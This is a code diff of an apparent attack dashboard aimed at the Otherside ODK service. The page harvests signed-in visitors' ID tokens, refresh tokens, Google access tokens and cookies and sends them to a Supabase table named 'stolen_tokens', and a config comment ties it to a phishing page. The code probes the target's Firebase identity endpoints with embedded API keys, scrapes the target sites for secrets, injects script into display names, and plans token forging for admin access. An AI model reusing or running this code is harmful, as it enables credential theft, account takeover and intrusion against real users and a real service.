+                <h3>Admin Access Testing <span class="badge badge-red">Critical</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
-                    These admin routes were discovered in the ODK dashboard. They require elevated permissions (canAccessRoles, canAccessAPIKeys, canWriteOrgConfig). Try accessing them with your current token or escalated tokens.
+                    Test if forged tokens grant admin-level access to ODK API endpoints. If successful, this proves the full attack chain: API Key + Service Account = Admin Access.
                 </p>
+                <div class="alert-box alert-critical">
+                    <strong>Full Attack Chain:</strong> Firebase API Key (confirmed active) + Leaked Service Account Key = Custom Token = Admin ID Token = Full Database Access = Stored XSS on all users.
+                </div>
                 <div class="btn-row">
-                    <button class="btn btn-primary" onclick="scanAdminRoutes()">Scan All Admin Routes</button>
-                    <button class="btn btn-outline" onclick="tryAdminWithHeaders()">Try with X-Role Headers</button>
-                    <button class="btn btn-outline" onclick="tryAdminWithGuest()">Try with Guest Token</button>
+                    <button class="btn btn-primary" onclick="testAdminAccess()">Test Admin Access with Forged Token</button>
+                    <button class="btn btn-danger" onclick="attemptAdminXSS()">Attempt Admin XSS Injection</button>
+                    <button class="btn btn-outline" onclick="enumerateAdminData()">Enumerate Admin Data</button>
+                    <button class="btn btn-outline" onclick="testOriginalToken()">Test Original Token Access</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="adminProgress"></div></div>
+                <div class="console" id="adminLog">
+                    <div class="log-info">[ADMIN] Ready. Forge a token first, then test admin access.</div>
                 </div>
             </div>
+
             <div class="card">
-                <h3>Admin Route Scanner Log</h3>
-                <div class="console" id="adminLog">
-                    <div class="log-info">[ADMIN] Ready. Click "Scan All Admin Routes" to test access.</div>
+                <h3>Admin Endpoints Map <span class="badge badge-green">Access</span></h3>
+                <div class="endpoint-grid" id="adminEndpointMap">
+                    <div style="color:#888;font-size:12px;">Test admin access to see endpoint results.</div>
                 </div>
             </div>
         </div>
 
-        <!-- RESULTS TAB -->
+        <!-- ===================================================== -->
+        <!-- TAB 6: RESULTS -->
+        <!-- ===================================================== -->
         <div class="tab-content" id="tab-results">
             <div class="card">
-                <h3>Exfiltrated Data <span class="badge badge-green">Supabase</span></h3>
+                <h3>Exfiltrated Data Summary <span class="badge badge-green">Supabase</span></h3>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="fetchResults()">Refresh from Supabase</button>
+                    <button class="btn btn-outline" onclick="exportResults()">Export as JSON</button>
                 </div>
                 <div class="console" id="resultsLog" style="max-height:600px;">
-                    <div class="log-info">[Results] Data will appear here after attacks.</div>
+                    <div class="log-info">[RESULTS] Data will appear here after attacks.</div>
                 </div>
             </div>
         </div>
@@ -349,14 +644,13 @@
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.7.6.2.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.9.0/jsrsasign-all-min.js"></script>
 
     <script>
         // =====================================================
-        // CONFIG
+        // CONFIGURATION
         // =====================================================
-        const ODK_API = 'https://odk.otherside.xyz/api/v0';
-        const PROXY = '/api/proxy';
+        const API = 'https://odk.otherside.xyz/api/v0';
 
         const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
@@ -364,67 +658,43 @@
         let db;
         try { db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY); } catch(e) { console.error('Supabase init error:', e); }
 
-        // THREE Firebase projects discovered
-        const FIREBASE_PROJECTS = [
-            {
-                name: 'reasonably-sound-marmot',
-                apiKey: 'AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis',
-                projectId: 'reasonably-sound-marmot',
-                storageBucket: 'reasonably-sound-marmot.appspot.com',
-                messagingSenderId: '6876223152',
-                appId: '1:6876223152:web:5a0cc55d55b765c484cd75',
-                measurementId: 'G-CWJ109SHV9',
-                tenantId: 'hound-j8zaz',
-                status: 'ADMIN_ONLY_OPERATION - Active, client signup blocked',
-                risk: 'CRITICAL'
-            },
-            {
-                name: 'primarily-endless-elephant',
-                apiKey: 'AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0',
-                projectId: 'primarily-endless-elephant',
-                storageBucket: 'primarily-endless-elephant.appspot.com',
-                messagingSenderId: '761033708851',
-                appId: '1:761033708851:web:fb54f41dc499d5a8ee1a46',
-                tenantId: 'hound-j8zaz',
-                status: 'Active - used by our phishing page',
-                risk: 'HIGH'
-            },
-            {
-                name: 'scarcely-calm-lark',
-                apiKey: 'AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU',
-                projectId: 'scarcely-calm-lark',
-                storageBucket: 'scarcely-calm-lark.appspot.com',
-                messagingSenderId: '',
-                appId: '',
-                tenantId: 'hound-j8zaz',
-                status: 'Active - documented in MSquared docs',
-                risk: 'HIGH'
-            }
-        ];
-
-        // Initialize Firebase with the PRIMARY project
-        const primaryProject = FIREBASE_PROJECTS[0];
+        // Firebase config for authentication (our own project)
         const firebaseConfig = {
-            apiKey: primaryProject.apiKey,
-            authDomain: `${primaryProject.projectId}.firebaseapp.com`,
-            projectId: primaryProject.projectId,
-            storageBucket: primaryProject.storageBucket,
-            messagingSenderId: primaryProject.messagingSenderId,
-            appId: primaryProject.appId
+            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
+            authDomain: "scarcely-calm-lark.firebaseapp.com",
+            projectId: "scarcely-calm-lark",
+            storageBucket: "scarcely-calm-lark.appspot.com",
+            messagingSenderId: "761033708851",
+            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
         };
 
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
-        auth.tenantId = primaryProject.tenantId;
+        auth.tenantId = "hound-j8zaz";
+
+        // Target Firebase API key (Otherside/ODK)
+        const TARGET_API_KEY = 'AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis';
+        const IDENTITY_TOOLKIT_BASE = 'https://identitytoolkit.googleapis.com/v1';
+        const SECURE_TOKEN_BASE = 'https://securetoken.googleapis.com/v1';
+
+        // Known API keys to test
+        const KNOWN_API_KEYS = [
+            { name: 'Otherside ODK (Primary)', key: 'AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis', source: 'Discovered from Otherside web app' },
+            { name: 'Our Project Key', key: 'AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0', source: 'Our Firebase project' },
+        ];
 
         let currentUser = null;
         let idToken = null;
         let refreshToken = '';
+        let forgedIdToken = null;
+        let forgedRefreshToken = null;
+        let serviceAccountKey = null;
+        let discoveredKeys = [];
+        let endpointsTested = 0;
+        let vulnsFound = 0;
+        let criticalFound = 0;
         let keysFound = 0;
-        let tokensObtained = 0;
         let dataExfil = 0;
-        let pubnubInstance = null;
-        let orgInfo = null;
 
         // =====================================================
         // LOGGING
@@ -434,17 +704,27 @@
             if (!el) return;
             const line = document.createElement('div');
             line.className = `log-${type}`;
-            line.textContent = msg;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
             el.appendChild(line);
             el.scrollTop = el.scrollHeight;
         }
 
         function updateStats() {
+            document.getElementById('statEndpoints').textContent = endpointsTested;
+            document.getElementById('statVulns').textContent = vulnsFound;
+            document.getElementById('statCritical').textContent = criticalFound;
             document.getElementById('statKeys').textContent = keysFound;
-            document.getElementById('statTokens').textContent = tokensObtained;
             document.getElementById('statExfil').textContent = dataExfil;
         }
 
+        function setProgress(id, pct) {
+            const el = document.getElementById(id);
+            if (el) el.style.width = pct + '%';
+        }
+
+        // =====================================================
+        // TAB SWITCHING
+        // =====================================================
         function switchTab(tab) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
@@ -452,10 +732,16 @@
             document.getElementById(`tab-${tab}`).classList.add('active');
         }
 
+        // =====================================================
+        // SUPABASE SAVE
+        // =====================================================
         async function saveToSupabase(data) {
             if (!db) return false;
             try {
-                const { data: result, error } = await db.from('stolen_tokens').insert([data]).select();
+                const { data: result, error } = await db
+                    .from('stolen_tokens')
+                    .insert([data])
+                    .select();
                 if (error) { console.error('DB Error:', error.message); return false; }
                 dataExfil++;
                 updateStats();
@@ -464,26 +750,17 @@
         }
 
         // =====================================================
-        // RENDER PROJECT CARDS
+        // JWT DECODE
         // =====================================================
-        function renderProjectCards() {
-            const grid = document.getElementById('projectGrid');
-            grid.innerHTML = '';
-            FIREBASE_PROJECTS.forEach((p, i) => {
-                const riskClass = p.risk === 'CRITICAL' ? 'err' : 'warn';
-                grid.innerHTML += `
-                    <div class="project-card">
-                        <h4>${p.name}</h4>
-                        <div class="key">API Key: ${p.apiKey}</div>
-                        <div class="key">Tenant: ${p.tenantId}</div>
-                        <div class="key">Project: ${p.projectId}</div>
-                        <div class="status ${riskClass}">${p.status}</div>
-                        <span class="badge badge-${p.risk === 'CRITICAL' ? 'critical' : 'orange'}">${p.risk}</span>
-                    </div>
-                `;
-            });
+        function decodeJWT(token) {
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) return null;
+                const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
+                const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+                return { header, payload };
+            } catch(e) { return null; }
         }
-        renderProjectCards();
 
         // =====================================================
         // GOOGLE SIGN-IN
@@ -502,7 +779,7 @@
 
                 try {
                     const stored = JSON.parse(localStorage.getItem(
-                        `[DEFAULT]/${primaryProject.projectId}.firebaseapp.com/` + user.uid
+                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
                     ) || '{}');
                     if (stored.stsTokenManager?.refreshToken) {
                         refreshToken = stored.stsTokenManager.refreshToken;
@@ -519,24 +796,26 @@
                     refresh_token: refreshToken,
                     google_access_token: pendingCred || '',
                     tenant_id: user.tenantId || '',
+                    auth_method: user.providerData[0]?.providerId || '',
+                    provider: user.providerData[0]?.providerId || '',
                     origin_domain: window.location.hostname,
                     user_agent: navigator.userAgent,
-                    notes: 'Custom Token Attack page - authenticated'
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: document.cookie || '',
+                    firebase_api_key: TARGET_API_KEY,
+                    attack_vector: 'custom_token_attack',
                 });
 
-                tokensObtained++;
                 document.getElementById('loginOverlay').classList.add('hidden');
                 document.getElementById('mainContent').classList.add('active');
                 document.getElementById('navUser').classList.add('active');
                 if (user.photoURL) document.getElementById('navAvatar').src = user.photoURL;
                 document.getElementById('navEmail').textContent = user.email;
 
-                log('identityLog', `[AUTH] Authenticated as ${user.email}`, 'success');
-                log('identityLog', `[AUTH] ID Token: ${idToken.substring(0, 40)}...`, 'data');
-                log('identityLog', `[AUTH] Project: ${primaryProject.name}`, 'info');
-
-                // Auto-fetch org info
-                fetchOrgInfo();
+                log('reconLog', `[AUTH] Authenticated as ${user.email}`, 'success');
+                log('reconLog', `[AUTH] ID Token obtained (${idToken.substring(0, 30)}...)`, 'success');
             }
         });
 
@@ -560,876 +839,1465 @@
         }).catch(() => {});
 
         // =====================================================
-        // PROXY FETCH
+        // API FETCH HELPERS
         // =====================================================
-        async function proxyFetch(endpoint, options = {}) {
-            const method = options.method || 'GET';
-            const body = options.body || null;
-            const token = options.token || idToken || '';
+        async function apiFetch(path, options = {}) {
+            const token = forgedIdToken || idToken;
+            if (!token) { return null; }
             try {
-                const resp = await fetch(PROXY, {
+                const resp = await fetch(`${API}/${path}`, {
+                    ...options,
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        'Content-Type': 'application/json',
+                        ...(options.headers || {})
+                    }
+                });
+                return resp;
+            } catch(e) { return null; }
+        }
+
+        async function identityFetch(endpoint, body, apiKey = TARGET_API_KEY) {
+            try {
+                const resp = await fetch(`${IDENTITY_TOOLKIT_BASE}/${endpoint}?key=${apiKey}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ endpoint, method, body, token })
+                    body: JSON.stringify(body)
                 });
-                const result = await resp.json();
-                return {
-                    ok: result.status >= 200 && result.status < 300,
-                    status: result.status,
-                    statusText: result.statusText || '',
-                    json: async () => result.data,
-                    text: async () => typeof result.data === 'string' ? result.data : JSON.stringify(result.data),
-                    headers: result.headers || {},
-                };
+                const data = await resp.json();
+                return { status: resp.status, data, ok: resp.ok };
             } catch(e) {
-                throw new Error(`Proxy fetch failed: ${e.message}`);
+                return { status: 0, data: { error: e.message }, ok: false };
             }
         }
 
-        async function apiWrite(endpoint, method, body) {
-            return await proxyFetch(endpoint, { method, body });
+        // =====================================================
+        // TAB 1: API KEY RECON
+        // =====================================================
+        async function runAPIKeyRecon() {
+            log('reconLog', '=== Starting Full API Key Reconnaissance ===', 'info');
+            setProgress('reconProgress', 10);
+
+            // Test each known key
+            for (let i = 0; i < KNOWN_API_KEYS.length; i++) {
+                const keyInfo = KNOWN_API_KEYS[i];
+                log('reconLog', `Testing key: ${keyInfo.name} (${keyInfo.key.substring(0, 10)}...)`, 'info');
+
+                // Test signUp
+                const signUpResult = await identityFetch('accounts:signUp', {}, keyInfo.key);
+                endpointsTested++;
+                if (signUpResult.data?.error?.message === 'ADMIN_ONLY_OPERATION') {
+                    log('reconLog', `[CRITICAL] ${keyInfo.name}: signUp returns ADMIN_ONLY_OPERATION - Key is ACTIVE!`, 'critical');
+                    vulnsFound++;
+                    criticalFound++;
+                    keysFound++;
+                    discoveredKeys.push({ ...keyInfo, status: 'active', details: 'ADMIN_ONLY_OPERATION on signUp' });
+                } else if (signUpResult.ok) {
+                    log('reconLog', `[VULN] ${keyInfo.name}: signUp SUCCEEDED - Anyone can create accounts!`, 'critical');
+                    vulnsFound++;
+                    criticalFound++;
+                    keysFound++;
+                    discoveredKeys.push({ ...keyInfo, status: 'active-open', details: 'signUp allows anonymous account creation' });
+                } else {
+                    const err = signUpResult.data?.error?.message || 'Unknown error';
+                    log('reconLog', `[INFO] ${keyInfo.name}: signUp returned: ${err}`, 'warning');
+                    discoveredKeys.push({ ...keyInfo, status: 'restricted', details: err });
+                }
+
+                setProgress('reconProgress', 10 + ((i + 1) / KNOWN_API_KEYS.length) * 40);
+            }
+
+            // Test signInWithCustomToken with dummy token
+            log('reconLog', '\n--- Testing signInWithCustomToken ---', 'info');
+            const customTokenResult = await identityFetch('accounts:signInWithCustomToken', {
+                token: 'invalid_token_test',
+                returnSecureToken: true
+            }, TARGET_API_KEY);
+            endpointsTested++;
+
+            if (customTokenResult.data?.error?.message === 'INVALID_CUSTOM_TOKEN') {
+                log('reconLog', '[IMPORTANT] signInWithCustomToken is ACTIVE - Returns INVALID_CUSTOM_TOKEN (endpoint works, just needs valid token)', 'success');
+                vulnsFound++;
+                log('reconLog', '[ATTACK] If we obtain a valid Custom Token (from Service Account), we can authenticate as ANY user!', 'warning');
+            } else if (customTokenResult.data?.error?.message === 'ADMIN_ONLY_OPERATION') {
+                log('reconLog', '[INFO] signInWithCustomToken is admin-only restricted', 'warning');
+            } else {
+                log('reconLog', `[INFO] signInWithCustomToken: ${customTokenResult.data?.error?.message || 'Unexpected response'}`, 'data');
+            }
+
+            setProgress('reconProgress', 60);
+
+            // Test other endpoints
+            log('reconLog', '\n--- Testing Other Endpoints ---', 'info');
+            const endpoints = [
+                { name: 'signInWithPassword', body: { email: 'test@test.com', password: 'test', returnSecureToken: true } },
+                { name: 'sendOobCode', body: { requestType: 'PASSWORD_RESET', email: 'test@test.com' } },
+                { name: 'createAuthUri', body: { identifier: 'test@test.com', continueUri: 'https://otherside.xyz' } },
+                { name: 'accounts:lookup', body: { idToken: idToken || 'dummy' } },
+                { name: 'accounts:update', body: { idToken: idToken || 'dummy', displayName: 'test' } },
+            ];
+
+            for (const ep of endpoints) {
+                const result = await identityFetch(ep.name, ep.body, TARGET_API_KEY);
+                endpointsTested++;
+                const errMsg = result.data?.error?.message || 'OK';
+                const isVuln = result.ok || errMsg === 'EMAIL_NOT_FOUND' || errMsg === 'INVALID_PASSWORD' || errMsg === 'USER_NOT_FOUND';
+                log('reconLog', `  ${ep.name}: ${errMsg} ${isVuln ? '[ENDPOINT ACTIVE]' : ''}`, isVuln ? 'success' : 'warning');
+                if (isVuln) vulnsFound++;
+            }
+
+            setProgress('reconProgress', 100);
+            updateStats();
+            renderAPIKeysList();
+
+            // Save to Supabase
+            await saveToSupabase({
+                attack_type: 'api_key_recon',
+                firebase_api_key: TARGET_API_KEY,
+                attack_vector: 'api_key_recon',
+                identity_toolkit_response: { discoveredKeys, endpointsTested },
+                notes: `Recon complete. ${criticalFound} critical findings. ${vulnsFound} vulnerabilities.`
+            });
+
+            log('reconLog', `\n=== Recon Complete ===`, 'success');
+            log('reconLog', `Results: ${endpointsTested} endpoints tested, ${vulnsFound} vulns found, ${criticalFound} critical`, 'success');
         }
 
-        // =====================================================
-        // IDENTITY TOOLKIT ATTACK
-        // =====================================================
-        const IDENTITY_ENDPOINTS = [
-            'accounts:signUp',
-            'accounts:signInWithCustomToken',
-            'accounts:signInWithIdp',
-            'accounts:signInWithPassword',
-            'accounts:signInWithEmailLink',
-            'accounts:createAuthUri',
-            'accounts:delete',
-            'accounts:lookup',
-            'accounts:resetPassword',
-            'accounts:sendOobCode',
-            'accounts:sendVerificationCode',
-            'accounts:verifyPhoneNumber',
-            'accounts:verifyIosClient',
-            'accounts:getAccountInfo',
-            'accounts:getOobCode',
-            'accounts:update',
-        ];
+        function renderAPIKeysList() {
+            const container = document.getElementById('apiKeysList');
+            if (discoveredKeys.length === 0) {
+                container.innerHTML = '<div style="color:#888;font-size:12px;">No API keys discovered yet.</div>';
+                return;
+            }
+            container.innerHTML = discoveredKeys.map((k, i) => {
+                const statusClass = k.status === 'active' || k.status === 'active-open' ? 'active-key' : k.status === 'restricted' ? 'unknown-key' : 'inactive-key';
+                const statusText = k.status === 'active' ? 'ACTIVE (Admin-Only)' : k.status === 'active-open' ? 'ACTIVE (Open Signup!)' : k.status === 'restricted' ? 'Restricted' : 'Unknown';
+                return `<div class="key-card ${k.status === 'active' || k.status === 'active-open' ? 'found' : ''}">
+                    <div class="key-name">${k.name}</div>
+                    <div class="key-value">${k.key}</div>
+                    <div class="key-status ${statusClass}">${statusText} - ${k.details}</div>
+                </div>`;
+            }).join('');
+        }
 
-        async function runIdentityToolkitAttack() {
-            log('identityLog', '[ATTACK] Running Identity Toolkit attack on ALL 3 projects...', 'warning');
+        async function testAllIdentityEndpoints() {
+            log('reconLog', '\n=== Testing All Identity Toolkit Endpoints ===', 'info');
+            const endpoints = [
+                { name: 'accounts:signUp', body: {}, desc: 'Create new account' },
+                { name: 'accounts:signInWithPassword', body: { email: 'admin@otherside.xyz', password: 'test123', returnSecureToken: true }, desc: 'Sign in with email/password' },
+                { name: 'accounts:signInWithCustomToken', body: { token: 'test', returnSecureToken: true }, desc: 'Sign in with custom token' },
+                { name: 'accounts:sendOobCode', body: { requestType: 'PASSWORD_RESET', email: 'admin@otherside.xyz' }, desc: 'Send password reset' },
+                { name: 'accounts:resetPassword', body: { oobCode: 'test', newPassword: 'test123' }, desc: 'Reset password' },
+                { name: 'accounts:update', body: { idToken: idToken || 'test', displayName: 'XSS<script>alert(1)<\/script>' }, desc: 'Update account (XSS in displayName)' },
+                { name: 'accounts:lookup', body: { idToken: idToken || 'test' }, desc: 'Lookup account info' },
+                { name: 'accounts:delete', body: { idToken: idToken || 'test' }, desc: 'Delete account' },
+                { name: 'accounts:createAuthUri', body: { identifier: 'admin@otherside.xyz', continueUri: window.location.href }, desc: 'Create auth URI' },
+                { name: 'accounts:issueSamlRequest', body: { providerId: 'saml.otherside', returnUri: window.location.href }, desc: 'Issue SAML request' },
+            ];
 
-            for (const project of FIREBASE_PROJECTS) {
-                log('identityLog', `\n[PROJECT] Testing ${project.name}...`, 'info');
+            for (let i = 0; i < endpoints.length; i++) {
+                const ep = endpoints[i];
+                const result = await identityFetch(ep.name, ep.body, TARGET_API_KEY);
+                endpointsTested++;
+                const errMsg = result.data?.error?.message || 'SUCCESS';
+                const errCode = result.data?.error?.code || '';
+                const isVuln = result.ok || errMsg === 'EMAIL_NOT_FOUND' || errMsg === 'INVALID_PASSWORD' ||
+                               errMsg === 'INVALID_CUSTOM_TOKEN' || errMsg === 'USER_NOT_FOUND' ||
+                               errMsg === 'INVALID_OOB_CODE' || errMsg === 'ADMIN_ONLY_OPERATION';
 
-                for (const endpoint of IDENTITY_ENDPOINTS) {
-                    const url = `https://identitytoolkit.googleapis.com/v1/${endpoint}?key=${project.apiKey}`;
-                    try {
-                        const resp = await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                returnSecureToken: true,
-                                // Various payloads for different endpoints
-                                ...(endpoint.includes('signUp') ? { email: 'test@test.com', password: 'test123456' } : {}),
-                                ...(endpoint.includes('signInWithCustomToken') ? { token: 'test', returnSecureToken: true } : {}),
-                                ...(endpoint.includes('signInWithPassword') ? { email: 'test@test.com', password: 'test123456' } : {}),
-                                ...(endpoint.includes('createAuthUri') ? { identifier: 'test@test.com' } : {}),
-                                ...(endpoint.includes('lookup') && idToken ? { idToken: idToken } : {}),
-                                ...(endpoint.includes('getAccountInfo') && idToken ? { idToken: idToken } : {}),
-                                ...(endpoint.includes('sendOobCode') ? { requestType: 'PASSWORD_RESET', email: 'test@test.com' } : {}),
-                            })
-                        });
+                log('reconLog', `  [${result.status}] ${ep.name}: ${errMsg} ${isVuln ? '[ENDPOINT REACHABLE]' : '[BLOCKED]'}`, isVuln ? 'success' : 'warning');
+                if (isVuln) vulnsFound++;
 
-                        const data = await resp.json();
-                        const error = data.error;
+                // Save each test
+                await saveToSupabase({
+                    attack_type: 'identity_toolkit_test',
+                    firebase_api_key: TARGET_API_KEY,
+                    attack_vector: ep.name,
+                    endpoint_tested: ep.name,
+                    response_status: result.status,
+                    response_error: errMsg,
+                    identity_toolkit_response: { endpoint: ep.name, description: ep.desc, response: result.data },
+                    notes: `${ep.desc} - ${errMsg}`
+                });
 
-                        if (error) {
-                            const msg = error.message || '';
-                            const code = error.code || '';
+                setProgress('reconProgress', (i + 1) / endpoints.length * 100);
+            }
 
-                            if (msg.includes('ADMIN_ONLY_OPERATION')) {
-                                log('identityLog', `[!] ${endpoint}: ADMIN_ONLY_OPERATION - API KEY ACTIVE! Only Service Account can use this.`, 'success');
-                                keysFound++;
-                                await saveToSupabase({
-                                    attack_type: 'identity_toolkit_admin_only',
-                                    victim_email: currentUser?.email || '',
-                                    id_token: idToken,
-                                    xss_target: `${endpoint}?key=${project.apiKey.substring(0, 20)}...`,
-                                    notes: `ADMIN_ONLY_OPERATION on ${project.name}/${endpoint}: API key is active, only Admin SDK can use it`
-                                });
-                            } else if (msg.includes('INVALID_CUSTOM_TOKEN')) {
-                                log('identityLog', `[+] ${endpoint}: Accepts custom tokens! (INVALID but endpoint works)`, 'success');
-                                tokensObtained++;
-                            } else if (msg.includes('EMAIL_NOT_FOUND')) {
-                                log('identityLog', `[+] ${endpoint}: EMAIL_NOT_FOUND = endpoint works, email enumeration possible!`, 'warning');
-                                keysFound++;
-                            } else if (msg.includes('INVALID_EMAIL')) {
-                                log('identityLog', `[+] ${endpoint}: Validates email format = endpoint active`, 'warning');
-                            } else if (msg.includes('TOO_MANY_ATTEMPTS')) {
-                                log('identityLog', `[!] ${endpoint}: Rate limited - endpoint is actively monitored!`, 'warning');
-                            } else if (msg.includes('OPERATION_NOT_ALLOWED')) {
-                                log('identityLog', `[-] ${endpoint}: Operation not allowed`, 'error');
-                            } else if (code === 400) {
-                                log('identityLog', `[?] ${endpoint}: 400 - ${msg.substring(0, 60)}`, 'warning');
-                            } else {
-                                log('identityLog', `[-] ${endpoint}: ${code} - ${msg.substring(0, 60)}`, 'error');
-                            }
-                        } else {
-                            // SUCCESS - we got actual data back!
-                            log('identityLog', `[!!!] ${endpoint}: SUCCESS! Got data: ${JSON.stringify(data).substring(0, 120)}`, 'success');
-                            tokensObtained++;
+            updateStats();
+            log('reconLog', `\nIdentity Toolkit testing complete. ${endpointsTested} endpoints tested.`, 'success');
+        }
+
+        async function discoverAPIKeys() {
+            log('reconLog', '\n=== Discovering API Keys from Otherside Web App ===', 'info');
+
+            const urls = [
+                'https://otherside.xyz',
+                'https://www.otherside.xyz',
+                'https://app.otherside.xyz',
+                'https://odk.otherside.xyz',
+            ];
+
+            for (const url of urls) {
+                try {
+                    log('reconLog', `Fetching ${url} for API keys...`, 'info');
+                    const resp = await fetch(url, { mode: 'cors' });
+                    const html = await resp.text();
+
+                    // Search for Firebase API keys
+                    const apiKeyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
+                    const matches = html.match(apiKeyRegex) || [];
+                    const uniqueMatches = [...new Set(matches)];
+
+                    if (uniqueMatches.length > 0) {
+                        log('reconLog', `[FOUND] ${uniqueMatches.length} API key(s) in ${url}:`, 'success');
+                        for (const key of uniqueMatches) {
+                            log('reconLog', `  Key: ${key}`, 'data');
                             keysFound++;
-
-                            await saveToSupabase({
-                                attack_type: 'identity_toolkit_success',
-                                victim_email: currentUser?.email || '',
-                                id_token: idToken,
-                                xss_target: `${endpoint}?key=${project.apiKey.substring(0, 20)}...`,
-                                idor_data: { endpoint, project: project.name, response: data },
-                                notes: `Identity Toolkit SUCCESS on ${project.name}/${endpoint}`
-                            });
+                            if (!discoveredKeys.find(k => k.key === key)) {
+                                discoveredKeys.push({ name: `Discovered from ${url}`, key, source: url, status: 'discovered' });
+                            }
                         }
-                    } catch(e) {
-                        log('identityLog', `[!] ${endpoint}: ${e.message}`, 'error');
+                    } else {
+                        log('reconLog', `  No API keys found in ${url}`, 'warning');
                     }
-                    await new Promise(r => setTimeout(r, 200));
+
+                    // Search for service account references
+                    const saRegex = /@[\w-]+\.iam\.gserviceaccount\.com/g;
+                    const saMatches = html.match(saRegex) || [];
+                    if (saMatches.length > 0) {
+                        log('reconLog', `[CRITICAL] Service Account email found in ${url}: ${saMatches.join(', ')}`, 'critical');
+                        criticalFound++;
+                    }
+
+                    // Search for firebase config
+                    const fbConfigRegex = /firebaseConfig\s*=\s*\{([^}]+)\}/g;
+                    const configMatches = html.match(fbConfigRegex) || [];
+                    if (configMatches.length > 0) {
+                        log('reconLog', `[FOUND] Firebase config in ${url}`, 'data');
+                    }
+                } catch(e) {
+                    log('reconLog', `  Cannot fetch ${url}: ${e.message}`, 'warning');
                 }
             }
 
-            log('identityLog', '\n[DONE] Identity Toolkit attack complete.', 'success');
+            // Also check known paths
+            log('reconLog', '\n--- Checking Known Config Paths ---', 'info');
+            const configPaths = [
+                '/__/firebase/init.json',
+                '/firebase-init.js',
+                '/js/firebase-config.js',
+                '/.well-known/firebase.json',
+                '/api/config',
+                '/api/v0/config',
+                '/api/v0/settings',
+                '/env.js',
+                '/config.js',
+                '/runtimeConfig.js',
+                '/_next/static/chunks/',
+            ];
+
+            for (const path of configPaths) {
+                for (const base of ['https://odk.otherside.xyz', 'https://otherside.xyz']) {
+                    try {
+                        const resp = await fetch(`${base}${path}`);
+                        if (resp.ok) {
+                            const text = await resp.text();
+                            const apiKeyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
+                            const matches = text.match(apiKeyRegex) || [];
+                            if (matches.length > 0) {
+                                log('reconLog', `[FOUND] API keys at ${base}${path}: ${matches.join(', ')}`, 'success');
+                                for (const key of matches) {
+                                    if (!discoveredKeys.find(k => k.key === key)) {
+                                        discoveredKeys.push({ name: `Discovered from ${base}${path}`, key, source: `${base}${path}`, status: 'discovered' });
+                                        keysFound++;
+                                    }
+                                }
+                            }
+                        }
+                    } catch(e) {}
+                }
+            }
+
+            renderAPIKeysList();
             updateStats();
+            log('reconLog', `\nAPI Key Discovery complete. ${keysFound} keys found.`, 'success');
+        }
+
+        async function testCustomApiKey() {
+            const key = document.getElementById('customApiKey').value.trim();
+            const endpoint = document.getElementById('apiKeyEndpoint').value;
+            if (!key) { log('apiKeyTestLog', 'Please enter an API key', 'error'); return; }
+
+            log('apiKeyTestLog', `Testing ${endpoint} with key ${key.substring(0, 10)}...`, 'info');
+
+            let body = {};
+            switch(endpoint) {
+                case 'signUp': body = {}; break;
+                case 'signInWithPassword': body = { email: 'test@test.com', password: 'test123', returnSecureToken: true }; break;
+                case 'signInWithCustomToken': body = { token: 'test_custom_token', returnSecureToken: true }; break;
+                case 'sendOobCode': body = { requestType: 'PASSWORD_RESET', email: 'test@test.com' }; break;
+                case 'resetPassword': body = { oobCode: 'test_code', newPassword: 'newpass123' }; break;
+                case 'update': body = { idToken: idToken || 'test', displayName: 'test' }; break;
+                case 'lookup': body = { idToken: idToken || 'test' }; break;
+                case 'delete': body = { idToken: idToken || 'test' }; break;
+                case 'createAuthUri': body = { identifier: 'test@test.com', continueUri: window.location.href }; break;
+                case 'issueSamlRequest': body = { providerId: 'saml.test', returnUri: window.location.href }; break;
+            }
+
+            const result = await identityFetch(`accounts:${endpoint}`, body, key);
+            endpointsTested++;
+
